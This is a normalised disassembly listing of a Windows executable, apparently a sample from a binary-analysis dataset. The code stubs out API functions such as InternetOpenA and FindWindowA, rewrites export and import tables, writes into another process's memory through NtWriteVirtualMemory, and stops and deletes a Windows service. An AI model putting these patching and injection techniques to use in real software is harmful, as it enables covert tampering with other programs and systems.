sub_401000
sub esp 0x8
push 0x0
push r--data
call GetFileVersionInfoSizeW
mov [ esp ] eax
test eax eax
je r-xdata
add esp 0x8
retn
push esi
push edi
mov edi [ GetProcessHeap@IAT ]
push eax
push 0x8
call edi
push eax
call [ HeapAlloc@IAT ]
mov esi eax
mov eax [ esp + 0x8 ]
push esi
push eax
push 0x0
push r--data
call GetFileVersionInfoW
lea ecx [ esp + 0x8 ]
push ecx
lea edx [ esp + 0x10 ]
push edx
push r--data
push esi
call VerQueryValueW
mov ecx [ esp + 0xc ]
mov eax [ ecx + 0x8 ]
and eax 0xffff0000
shl eax 0xc
mov [ esp + 0x8 ] eax
mov edx [ ecx + 0x8 ]
and edx 0xf
shl edx 0x18
or eax edx
mov [ esp + 0x8 ] eax
mov edx [ ecx + 0xc ]
and edx 0x7f0000
add edx edx
or eax edx
mov [ esp + 0x8 ] eax
mov ecx [ ecx + 0xc ]
and ecx 0x1fff
or ecx 0x1a000
push esi
or eax ecx
push 0x0
mov [ esp + 0x10 ] eax
call edi
push eax
call [ HeapFree@IAT ]
mov eax [ esp + 0x8 ]
pop edi
pop esi
sub_4010c0
sub esp 0xc
test esi esi
je r-xdata
add esp 0xc
retn
mov eax [ esi + 0x3c ]
add eax esi
push edi
mov edi [ eax + 0x78 ]
mov [ esp + 0x4 ] edi
test edi edi
je r-xdata
pop edi
mov ecx [ edi + esi + 0x14 ]
mov edx [ edi + esi + 0x1c ]
push ebx
mov ebx [ edi + esi + 0x20 ]
push ebp
lea eax [ esp + 0x14 ]
push eax
add ecx ecx
push 0x40
add ecx ecx
push ecx
add edx esi
add ebx esi
push edx
mov [ esp + 0x20 ] ebx
call [ VirtualProtect@IAT ]
xor ebp ebp
cmp [ edi + esi + 0x18 ] ebp
jbe r-xdata
pop ebp
pop ebx
jmp r-xdata
mov edi [ ebx + ebp * 4 ]
mov ecx [ r--data ]
add edi esi
mov ebx r--data
test ecx ecx
je r-xdata
mov eax [ esp + 0xc ]
inc ebp
cmp ebp [ eax + esi + 0x18 ]
jb r-xdata
mov eax edi
lea ebx [ ebx ]
mov ebx [ esp + 0x10 ]
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
mov eax [ esp + 0xc ]
mov edx [ eax + esi + 0x24 ]
mov ecx [ ebx + 0x4 ]
mov eax [ eax + esi + 0x1c ]
lea edx [ edx + ebp * 2 ]
movzx edx [ edx + esi ]
sub ecx esi
lea edx [ eax + edx * 4 ]
mov [ edx + esi ] ecx
mov ecx [ ebx + 0x8 ]
add ebx 0x8
test ecx ecx
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
jmp r-xdata
test eax eax
je r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
sub_4011b0
sub esp 0x8
mov eax [ fs : 0x18 ]
mov ecx [ eax + 0x30 ]
push ebx
push ebp
mov ebp [ ecx + 0xc ]
mov ebx [ ebp + 0xc ]
add ebp 0xc
mov [ esp + 0x8 ] ebp
cmp ebx ebp
je r-xdata
pop ebp
pop ebx
add esp 0x8
retn
push edi
mov ebx [ ebx ]
cmp ebx ebp
jne r-xdata
mov edi [ esi + 0x4 ]
mov edx [ edi + ecx ]
add edi ecx
cmp edx [ esi + 0x8 ]
je r-xdata
mov ecx [ ebx + 0x18 ]
mov eax [ ecx + 0x3c ]
mov edx [ esi ]
add eax ecx
cmp edx [ eax + 0x58 ]
jne r-xdata
pop edi
lea edx [ esp + 0x10 ]
push edx
mov edx [ eax + 0xdc ]
mov eax [ eax + 0xd8 ]
push 0x40
push edx
add eax ecx
push eax
call [ VirtualProtect@IAT ]
cmp [ esp + 0x18 ] 0x0
je r-xdata
mov ecx [ esi + 0x8 ]
mov [ edi ] ecx
xor ecx ecx
cmp [ esi + 0xc ] ecx
jbe r-xdata
mov eax [ esi + 0xc ]
lea ecx [ eax + 0x1 ]
mov [ esi + 0xc ] ecx
mov [ esi + eax * 8 + 0x10 ] edi
mov edx [ edi ]
mov [ esi + eax * 8 + 0x14 ] edx
mov eax [ esi + 0x8 ]
mov [ edi ] eax
jmp r-xdata
lea eax [ esi + 0x10 ]
lea ecx [ ecx ]
mov edi [ eax ]
mov ebp [ eax + 0x4 ]
mov edx [ ebx + 0x18 ]
inc ecx
mov [ edx + edi ] ebp
add eax 0x8
cmp ecx [ esi + 0xc ]
jb r-xdata
mov ebp [ esp + 0xc ]
sub_401270
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax [ ebp + 0xc ]
sub esp 0x28
push esi
push edi
cmp eax 0x4a
je r-xdata
mov edi [ ebp + 0x10 ]
test edi edi
je r-xdata
cmp eax 0x410
je r-xdata
xor eax eax
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x10
mov esi [ ebp + 0x14 ]
mov ecx [ esi + 0x4 ]
mov edx [ esi + 0x8 ]
push rw-data
push ecx
push edx
call [ rw-data ]
test eax eax
jne r-xdata
cmp [ ebp + 0x14 ] 0x203
jne r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
push ecx
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ DefWindowProcW@IAT ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x10
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] eax
mov [ esp + 0x2c ] eax
mov [ esp + 0x14 ] eax
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x1c ]
push ecx
push 0x20
lea edx [ esp + 0x18 ]
push edx
mov [ esp + 0x28 ] 0x18
mov [ esp + 0x20 ] edi
call NtOpenProcess
test eax eax
jl r-xdata
push 0x0
call [ PostQuitMessage@IAT ]
mov eax [ esi ]
mov ecx [ esp + 0xc ]
push 0x0
push 0x192
push rw-data
push eax
push ecx
call NtWriteVirtualMemory
mov edx [ esp + 0xc ]
push edx
call NtClose
pop edi
mov eax 0x1
pop esi
mov esp ebp
pop ebp
retn 0x10
sub_401360
mov ecx [ esp + 0x10 ]
test ecx ecx
jne r-xdata
mov eax [ esp + 0xc ]
mov eax rw-data
mov edx 0x1
[ eax ] edx
inc edx
cmp edx 0x1
mov eax sub_401350
jg r-xdata
mov [ esp + 0x10 ] ecx
mov [ esp + 0xc ] eax
jmp [ CreateThread@IAT ]
sub_4013a0
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ strncmp@IAT ]
push 0x4
push r--data
push esi
call edi
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x20 ]
mov eax [ esp + 0x1c ]
push ecx
mov ecx [ esp + 0x1c ]
push edx
mov edx [ esp + 0x1c ]
push eax
mov eax [ esp + 0x1c ]
push ecx
push edx
push eax
push esi
call [ CreateFileA@IAT ]
pop edi
pop esi
retn 0x1c
push 0xc
lea eax [ esi + 0x4 ]
push r--data
push eax
call edi
add esp 0xc
test eax eax
jne r-xdata
pop edi
or eax 0xffffffff
pop esi
retn 0x1c
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x20 ]
mov eax [ esp + 0x1c ]
push ecx
mov ecx [ esp + 0x1c ]
push edx
mov edx [ esp + 0x1c ]
push eax
mov eax [ esp + 0x1c ]
push ecx
push edx
push eax
push esi
call [ CreateFileA@IAT ]
pop edi
mov [ rw-data ] eax
pop esi
retn 0x1c
sub_4014e0
push edi
mov edi [ esp + 0xc ]
cmp edi 0xffff
jbe r-xdata
mov eax [ esp + 0x8 ]
push edi
push eax
call [ GetProcAddress@IAT ]
pop edi
retn 0x8
mov ecx r--data
mov eax edi
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
mov ecx r--data
mov eax edi
lea esp [ esp ]
push esi
push 0x1
mov esi rw-data
call sub_4011b0
mov eax [ esp + 0x10 ]
add esp 0x4
pop esi
push edi
push eax
call [ GetProcAddress@IAT ]
pop edi
retn 0x8
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
cmp [ rw-data ] eax
jbe r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
mov ecx [ eax * 8 + rw-data ]
mov edx [ eax * 8 + rw-data ]
inc eax
mov [ ecx ] edx
cmp eax [ rw-data ]
jb r-xdata
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
sub_4015c0
push ebp
mov ebp esp
sub esp 0x178
push ebx
push esi
push edi
mov ebx eax
push 0x65
push ebx
call [ LoadIconW@IAT ]
mov edi eax
mov [ rw-data ] 0x3b8
mov [ rw-data ] 0x410
mov [ rw-data ] 0x2710
mov [ rw-data ] 0x4
mov [ rw-data ] edi
call [ GetCurrentThreadId@IAT ]
push rw-data
push 0x100
mov [ rw-data ] eax
mov esi r--data
call [ GetCurrentDirectoryW@IAT ]
add eax eax
mov ecx eax
sub ecx esi
lea ecx [ ecx + rw-data ]
movzx eax [ esi ]
mov [ ecx + esi ] ax
add esi 0x2
test ax ax
jne r-xdata
xor esi esi
xor eax eax
jmp r-xdata
movzx ecx [ eax + r--data ]
mov [ eax + rw-data ] cx
add eax 0x2
cmp cx si
jne r-xdata
xor eax eax
jmp r-xdata
movzx ecx [ eax + r--data ]
mov [ eax + rw-data ] cx
add eax 0x2
cmp cx si
jne r-xdata
lea eax [ ebp - 0x70 ]
push eax
mov [ ebp - 0x70 ] 0x40
mov [ ebp - 0x6c ] sub_401270
mov [ ebp - 0x68 ] esi
mov [ ebp - 0x64 ] esi
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x5c ] edi
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x54 ] esi
mov [ ebp - 0x50 ] esi
mov [ ebp - 0x4c ] r--data
call [ RegisterClassW@IAT ]
movzx eax ax
cmp eax esi
je r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebx
mov esp ebp
pop ebp
retn
push esi
push ebx
push esi
push 0xfffffffd
push 0x80000000
push 0x80000000
push esi
push esi
push 0x8000000
push rw-data
push eax
push esi
call [ CreateWindowExW@IAT ]
mov [ ebp - 0x10 ] eax
cmp eax esi
je r-xdata
push rw-data
push esi
mov [ rw-data ] eax
mov [ rw-data ] 0x7
call [ Shell_NotifyIconW@IAT ]
mov edi [ GetModuleHandleW@IAT ]
push r--data
call edi
push r--data
call edi
mov ebx eax
cmp ebx esi
jne r-xdata
mov eax [ ebx + 0x3c ]
mov esi [ eax + ebx + 0x80 ]
mov edx [ eax + ebx + 0xdc ]
add eax ebx
lea ecx [ ebp - 0x74 ]
push ecx
mov [ ebp - 0x8 ] eax
mov eax [ eax + 0xd8 ]
push 0x40
push edx
add eax ebx
push eax
add esi ebx
call [ VirtualProtect@IAT ]
mov edi [ esi ]
mov eax [ edi + ebx ]
add edi ebx
test eax eax
je r-xdata
push r--data
call edi
mov ebx eax
mov ebx [ GetModuleHandleW@IAT ]
push r--data
call ebx
mov edi [ GetProcAddress@IAT ]
mov esi eax
push r--data
push esi
call edi
test eax eax
je r-xdata
js r-xdata
push r--data
push esi
call edi
test eax eax
je r-xdata
mov edx [ ebp - 0x10 ]
push 0x0
push 0x1
push 0x4a
push edx
call eax
jmp r-xdata
mov eax [ edi + 0x4 ]
add edi 0x4
test eax eax
jne r-xdata
lea eax [ eax + ebx + 0x2 ]
mov [ ebp - 0xc ] eax
mov ecx eax
mov eax r--data
mov esi [ InternetOpenA@IAT ]
mov edi [ VirtualProtect@IAT ]
lea eax [ ebp - 0x8 ]
push eax
mov ecx esi
dec ecx
push 0x40
or ecx 0x7
push 0x10
inc ecx
push ecx
call edi
mov [ esi ] 0x14c2c033
mov [ esi + 0x4 ] 0x0
mov esi [ LookupAccountSidA@IAT ]
lea edx [ ebp - 0xc ]
push edx
mov eax esi
dec eax
push 0x40
or eax 0x7
push 0x10
inc eax
push eax
call edi
mov [ esi ] 0x1cc2c033
mov [ esi + 0x4 ] 0x0
mov esi [ FindWindowA@IAT ]
lea ecx [ ebp - 0x78 ]
push ecx
mov edx esi
dec edx
push 0x40
or edx 0x7
push 0x10
inc edx
push edx
call edi
push r--data
mov [ esi ] 0x8c2c033
mov [ esi + 0x4 ] 0x0
call ebx
mov ebx eax
mov esi ebx
call sub_4010c0
mov edi [ LoadLibraryExW@IAT ]
mov esi [ fs : 0x18 ]
push 0x1
push 0x0
push r--data
call edi
mov ecx [ esi + 0x30 ]
push 0x1
push 0x0
push r--data
mov [ ecx + 0x8 ] eax
call edi
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x1
push 0x4a
call eax
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
push rw-data
push 0x2
call [ Shell_NotifyIconW@IAT ]
mov eax [ ebp - 0x10 ]
push eax
call [ DestroyWindow@IAT ]
mov esi [ eax + 0x3c ]
mov edx [ esi + eax + 0x80 ]
mov ecx [ edx + eax ]
add esi eax
add edx eax
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] edx
test ecx ecx
je r-xdata
mov ecx [ ebp - 0xc ]
mov eax r--data
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x58 ]
mov [ rw-data ] edx
mov eax [ esi + 0x10 ]
sub eax [ esi ]
mov [ rw-data ] sub_401440
sub eax ebx
add eax edi
mov [ rw-data ] eax
mov ecx [ esi + 0x10 ]
sub ecx [ esi ]
mov [ ecx + edi ] sub_401440
jmp r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
mov edx [ esi + 0x28 ]
mov esi [ GetProcAddress@IAT ]
push 0xa
add edx eax
push eax
mov [ rw-data ] edx
call esi
mov [ rw-data ] eax
mov eax [ rw-data ]
push 0x10
push eax
call esi
mov ecx [ rw-data ]
push 0x0
push 0x1
push ecx
mov [ rw-data ] eax
call [ rw-data ]
test eax eax
je r-xdata
mov edi [ edx + 0x10 ]
add edi eax
lea esi [ ecx + eax ]
test ecx ecx
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov eax [ ebp - 0x10 ]
push 0x100
lea edx [ ebp - 0x178 ]
push edx
push eax
mov [ ebp - 0x4 ] 0x0
call [ GetWindowTextA@IAT ]
mov eax r--data
lea edx [ ebp - 0x4 ]
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x40 ] eax
push edx
lea eax [ ebp - 0x48 ]
push eax
lea ecx [ ebp - 0x178 ]
push 0x11
mov [ ebp - 0x48 ] r--data
mov [ ebp - 0x3c ] ecx
call [ rw-data ]
test al al
je r-xdata
mov ecx [ esi ]
add esi 0x4
test ecx ecx
je r-xdata
mov esi edi
mov ecx [ ebp - 0xc ]
mov eax r--data
mov ecx [ rw-data ]
mov eax ecx
inc ecx
mov [ rw-data ] ecx
mov edx [ esi + 0x10 ]
sub edx [ esi ]
mov [ eax * 8 + rw-data ] sub_4014c0
sub edx ebx
add edx edi
mov [ eax * 8 + rw-data ] edx
mov eax [ esi + 0x10 ]
sub eax [ esi ]
mov [ eax + edi ] sub_4014c0
jmp r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov ecx [ edx + 0x14 ]
add edx 0x14
mov [ ebp - 0x8 ] edx
test ecx ecx
jne r-xdata
jmp r-xdata
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov edx [ GetTickCount@IAT ]
mov eax [ timeGetTime@IAT ]
lea ecx [ ebp - 0x178 ]
mov [ ebp - 0x30 ] ecx
mov ecx [ QueryPerformanceCounter@IAT ]
mov [ ebp - 0x2c ] edx
mov edx [ QueryPerformanceFrequency@IAT ]
mov [ ebp - 0x48 ] sub_4015b0
mov [ ebp - 0x44 ] 0x26ba
mov [ ebp - 0x40 ] r--data
mov [ ebp - 0x3c ] 0x8a3dbe
mov [ ebp - 0x38 ] 0xffff0328
mov [ ebp - 0x34 ] 0x1
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] edx
call sub_401000
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x48 ]
push ecx
push 0x4
mov [ ebp - 0x18 ] 0x5040101
call [ rw-data ]
test al al
je r-xdata
mov esi [ ebp - 0xc ]
test ecx ecx
jns r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x58 ]
mov [ rw-data ] edx
mov eax [ esi + 0x10 ]
sub eax [ esi ]
mov [ rw-data ] sub_4014d0
sub eax ebx
add eax edi
mov [ rw-data ] eax
mov ecx [ esi + 0x10 ]
sub ecx [ esi ]
mov [ ecx + edi ] sub_4014d0
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea ecx [ ecx + eax + 0x2 ]
and ecx 0xffff
jmp r-xdata
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
push 0x0
mov esi rw-data
call sub_4011b0
add esp 0x4
lea edx [ ebp - 0x4 ]
push edx
push 0x0
push 0x5
call [ rw-data ]
test al al
je r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x8 ]
mov [ edi ] eax
mov ecx [ esi ]
add edi 0x4
add esi 0x4
test ecx ecx
jne r-xdata
push ecx
push ebx
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push rw-data
push 0x1
mov [ rw-data ] 0x10
call [ Shell_NotifyIconW@IAT ]
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
sub_401bb0
sub esp 0x38
push ebx
push 0xf003f
push 0x0
push 0x0
call [ OpenSCManagerW@IAT ]
mov ebx eax
mov eax [ esp + 0x40 ]
call sub_4015c0
test eax eax
je r-xdata
push ebp
push esi
mov esi [ GetMessageW@IAT ]
push edi
push 0x0
push 0x0
push 0x0
lea eax [ esp + 0x1c ]
push eax
call esi
test eax eax
je r-xdata
push 0xffffffff
call [ ExitProcess@IAT ]
mov ecx [ rw-data ]
push ecx
call [ CloseHandle@IAT ]
mov edi [ OpenServiceW@IAT ]
push 0xf003f
push r--data
push ebx
call edi
mov ebp [ CloseServiceHandle@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov edi [ TranslateMessage@IAT ]
mov ebp [ DispatchMessageW@IAT ]
lea edx [ esp + 0x2c ]
push edx
push 0x1
push esi
call [ ControlService@IAT ]
push esi
call [ DeleteService@IAT ]
push esi
call ebp
push 0xf003f
push r--data
push ebx
call edi
mov esi eax
test esi esi
je r-xdata
push 0x0
push 0x0
push 0x0
lea eax [ esp + 0x1c ]
push eax
call esi
test eax eax
jne r-xdata
lea ecx [ esp + 0x10 ]
push ecx
call edi
lea edx [ esp + 0x10 ]
push edx
call ebp
push ebx
call ebp
push rw-data
push 0x2
call [ Shell_NotifyIconW@IAT ]
mov eax [ rw-data ]
push eax
call [ DestroyWindow@IAT ]
push 0x0
call [ ExitProcess@IAT ]
cmp eax 0xffffffff
je r-xdata
sub_401ced
push 0x5c
push r--data
call sub_40227c
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ebx
lea eax [ ebp - 0x6c ]
push eax
call [ GetStartupInfoW@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x4 ] 0x1
mov eax [ fs : 0x18 ]
mov esi [ eax + 0x4 ]
mov [ ebp - 0x20 ] ebx
mov edi rw-data
xor esi esi
inc esi
cmp eax esi
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
push 0x1f
call _amsg_exit
pop ecx
jmp r-xdata
push 0x3e8
call [ Sleep@IAT ]
jmp r-xdata
xor esi esi
inc esi
mov [ ebp - 0x20 ] esi
jmp r-xdata
mov [ rw-data ] esi
mov [ rw-data ] esi
push r--data
push r--data
call _initterm_e
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax esi
jne r-xdata
push ebx
push esi
push edi
call [ InterlockedCompareExchange@IAT ]
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
cmp eax esi
jne r-xdata
cmp [ ebp - 0x20 ] ebx
jne r-xdata
push r--data
push r--data
call _initterm
pop ecx
pop ecx
mov [ rw-data ] 0x2
jmp r-xdata
cmp [ rw-data ] ebx
je r-xdata
push ebx
push edi
call [ InterlockedExchange@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
mov eax 0xff
call sub_4022c1
retn
mov eax [ _wcmdln@IAT ]
cmp [ eax ] ebx
je r-xdata
push rw-data
call sub_4021b0
pop ecx
test eax eax
je r-xdata
mov eax [ eax ]
push ebx
push 0x2
push ebx
call [ rw-data ]
cmp cx 0x22
jne r-xdata
cmp cx bx
je r-xdata
inc eax
inc eax
jmp r-xdata
xor ecx ecx
cmp [ ebp - 0x1c ] ebx
sete cl
mov [ ebp - 0x1c ] ecx
movzx ecx [ eax ]
cmp cx bx
je r-xdata
cmp [ ebp - 0x1c ] ebx
jne r-xdata
mov [ ebp - 0x24 ] eax
movzx ecx [ eax ]
cmp cx 0x20
ja r-xdata
test [ ebp - 0x40 ] 0x1
je r-xdata
cmp cx 0x20
ja r-xdata
push 0xa
pop ecx
movzx ecx [ ebp - 0x3c ]
jmp r-xdata
inc eax
inc eax
mov [ ebp - 0x24 ] eax
jmp r-xdata
push ecx
push eax
push ebx
push __dos_header
call sub_401bb0
sub_401e7a
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x28 ]
mov [ rw-data ] eax
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
cmp [ rw-data ] ebx
jne r-xdata
push eax
call [ _exit@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ rw-data ]
jmp r-xdata
call [ _cexit@IAT ]
call sub_4022c1
retn
sub_401ecb
mov eax 0x5a4d
cmp [ __dos_header ] ax
je r-xdata
mov eax [ r--data ]
lea eax [ eax + __dos_header ]
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
jmp r-xdata
movzx ecx [ eax + 0x18 ]
cmp ecx 0x10b
je r-xdata
push 0x2
mov [ rw-data ] eax
call [ __set_app_type@IAT ]
push 0xffffffff
call [ _encode_pointer@IAT ]
pop ecx
pop ecx
mov [ rw-data ] eax
mov [ rw-data ] eax
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_4020ca
call sub_402325
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ eax + 0x74 ] 0xe
jbe r-xdata
cmp ecx 0x20b
jne r-xdata
call sub_4022fa
cmp [ rw-data ] 0xffffffff
jne r-xdata
push sub_402325
call [ __setusermatherr@IAT ]
pop ecx
xor ecx ecx
cmp [ eax + 0xe8 ] ecx
cmp [ eax + 0x84 ] 0xe
jbe r-xdata
xor eax eax
retn
push 0xffffffff
call [ _configthreadlocale@IAT ]
pop ecx
xor ecx ecx
cmp [ eax + 0xf8 ] ecx
jmp r-xdata
setne cl
mov eax ecx
sub_401fb6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn 0x4
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
call ?terminate@@YAXXZ
cmp eax 0x19930521
je r-xdata
cmp eax 0x19930522
je r-xdata
cmp eax 0x1994000
jne r-xdata
sub_40200e
push 0x14
push r--data
call sub_40227c
push [ rw-data ]
mov esi [ _decode_pointer@IAT ]
call esi
pop ecx
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
push 0x8
call _lock
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rw-data ]
call esi
mov [ ebp - 0x1c ] eax
push [ rw-data ]
call esi
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push [ ebp + 0x8 ]
mov esi [ _encode_pointer@IAT ]
call esi
pop ecx
push eax
call __dllonexit
mov [ ebp - 0x24 ] eax
push [ ebp - 0x1c ]
call esi
mov [ rw-data ] eax
push [ ebp - 0x20 ]
call esi
add esp 0x14
mov [ rw-data ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4020aa
mov eax [ ebp - 0x24 ]
push [ ebp + 0x8 ]
call [ _onexit@IAT ]
pop ecx
jmp r-xdata
call sub_4022c1
retn
sub_4020ca
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_4020f0
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_402120
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_402160
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
jbe r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4021b0
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_4022d5
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_402120
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_402160
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40227c
push sub_4022d5
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_4022d5
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_4023d6
push rw-data
call _except_handler4_common
add esp 0x18
pop ebp
retn
sub_4022fa
mov edi edi
push esi
push 0x30000
push 0x10000
xor esi esi
push esi
call _controlfp_s
add esp 0xc
test eax eax
je r-xdata
pop esi
retn
push esi
push esi
push esi
push esi
push esi
call _invoke_watson
add esp 0x14
sub_402328
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
